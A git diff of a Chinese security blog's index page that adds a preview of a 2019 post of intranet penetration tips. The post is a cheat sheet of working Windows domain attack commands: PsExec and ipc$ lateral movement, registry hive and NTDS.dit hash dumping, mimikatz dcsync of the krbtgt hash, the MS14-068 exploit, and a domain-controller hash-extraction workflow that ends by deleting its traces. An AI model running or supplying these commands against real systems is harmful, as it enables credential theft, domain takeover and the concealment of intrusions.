@@ -154,6 +154,82 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-内网tips持续更新" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/25/内网tips持续更新/">内网tips持续更新</a>
+    </h1>
+  
+
+        
+        <a href="/2019/02/25/内网tips持续更新/" class="archive-article-date">
+  	<time datetime="2019-02-25T14:59:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>net use常见套路:<br>net use \ip\c$ pwd /user:administrator              //建立ipc$<br>net use                                                           //查看ipc$共享<br>copy PsExec.exe \192.168.137.133\c$              //拷到C盘<br>copy PsExec.exe \192.168.137.133\admin$      //通常是C:/Windows<br>net use z: \del                                                 //删除<br>net use S: \ip\c$ pwd /user:administrator                    //映射到本地Span</p>
+<p>psexec：<br>psexec.exe \ip –accepteula \域名 -u username -p password cmd.exe</p>
+<p>-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）<br>-d 不等待程序执行完就返回<br>比如想上传一个本地的getpass到你远程连接的服务器上去:<br>Psexec.exe \ip –u user –p pass –c c:\getpass.exe –d</p>
+<p>常见错误：<br>错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限；<br>错误号51，Windows无法找到网络路径：网络有问题；<br>错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙(端口过滤)；at的话可能未开TaskSchedule<br>错误号67，找不到网络名： 判断目标主机已禁用ADMIN$共享<br>错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连；<br>错误号1326，未知的用户名或错误密码；<br>错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动；<br>错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码</p>
+<p>win10 at命令没了，但在建立ipc的主机上仍然能成功创建<br>at \IP 23:30 \IP\C$\1.exe                      //执行C盘1.exe</p>
+<h3 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit:"></a>NTDS.dit:</h3><p>reg save命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hiv</span><br><span class="line">reg save hklm\system system.hiv</span><br><span class="line">reg save hklm\security security.hiv</span><br></pre></td></tr></table></figure></p>
+<p>secretsdump.py:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python secretsdump.py -ntds c:\ntds.dit -system c:\system.hiv LOCAL</span><br></pre></td></tr></table></figure></p>
+<p>QuarkPwDump.exe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hiv</span><br></pre></td></tr></table></figure></p>
+<p>实战中hash导出流程(转自l3mon师傅)</p>
+<p>1.建立ipc\$连接 <code>net use \\DC1\c\$ password /user:username</code> 2.复制文件到DC <code>copy .\* \\DC1\windows\tasks</code> 3.sc建立远程服务启动程序 <code>sc \\DC1 create backupntds binPath= &quot;cmd /c start c:\windows\tasks\shadowcopy.bat&quot; type= share start= auto error= ignore DisplayName= BackupNTDS</code> 4.启动服务 <code>sc \\DC1 start backupntds</code> 5.删除服务 <code>sc \\DC1 delete backupntds</code> 6.讲hash转移到本地 <code>move \\DC1\c\$\windows\tasks\hash.txt .</code> 7.删除记录文件 <code>del \\DC1\c\$\windows\tasks\ntds.dit \\DC1\c\$\windows\tasks\QuarksPwDump.exe \\DC1\c\$\windows\tasks\shadowcopy.bat \\DC1\c$\windows\tasks\vshadow.exe</code></p>
+<p>Kerberos：<br>krbtgt可通过拿下域控来获得：lsadump::dcsync /domain:域名 /user:krbtgt<br>通过DRSR来获得所有用户hash：lsadump::dcsync /domain:域名 /user:用户名<br>导出：sekurlsa::tickets /export</p>
+<p>查询域用户对域成员机器关系:<br>当控制一台域成员计算机，运行cmd时存在三种用户权限情况：域用户，本地用户，SYSTEM用户。用whoami可以区分三种情况，域用户输出结果是domain\username，本地用户是hostname\username，SYSTEM输出是ntauthority\system。在这三种情况中，本地用户是无法运行之前说的所有命令的，因为本质上所有查询都是通过ldap协议去域控制器上查询，这个查询需要经过权限认证，只有域用户才有这个权限。当域用户运行查询命令时，会自动使用kerberos协议认证，无需额外输入账号密码。SYSTEM用户的情况比较特殊，在域中，除了普通用户外，所有机器都有一个机器用户，用户名是机器名后加$，本质上机器上的SYSTEM用户对应的就是域里面的机器用户，所以SYSTEM权限是可以运行之前说的查询命令的。</p>
+<p>ms14-068找sid方法：<br>域用户：whoami /user<br>本地账户：dsquery user –s 192.168.1.111 –u userName –p passWord –name admin* | dsget user –s 192.168.1.111 –u userName –p passWord –sid<br>ms14-068.py -u userName@域名 -s SID -d 192.168.1.111 -p passWord </p>
+<p>cmd/regedit/taskmgr绕过禁用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/02/25/内网tips持续更新/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-TP是如何Run起来的" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
@@ -822,19 +898,19 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">碎碎念</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Machine Learning Basic</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">立志不倒的flags</a>
+                <a href="javascript:void(0)" class="js-tag color4">碎碎念</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">立志不倒的flags</a>
               </li>
              
               <li class="article-tag-list-item">
